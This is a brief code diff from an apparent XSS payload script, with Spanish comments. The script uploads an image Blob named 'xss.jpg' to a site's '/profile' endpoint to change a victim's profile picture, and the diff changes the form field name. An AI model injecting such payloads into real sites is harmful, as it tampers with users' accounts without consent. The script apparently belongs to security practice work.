@@ -13,7 +13,7 @@ async function changeProfilePic() {
     // 3. Añadimos el Blob al FormData.
     // ¡¡IMPORTANTE!! Reemplaza 'profile_image' con el nombre del campo que encontraste.
     // El tercer argumento es el nombre del archivo que "finge" ser, puede ser cualquiera.
-    formData.append('profile_image', imageBlob, 'xss.jpg');
+    formData.append('profile_pic', imageBlob, 'xss.jpg');
 
     // 4. Enviamos la petición POST al perfil.
     await fetch('/profile', {
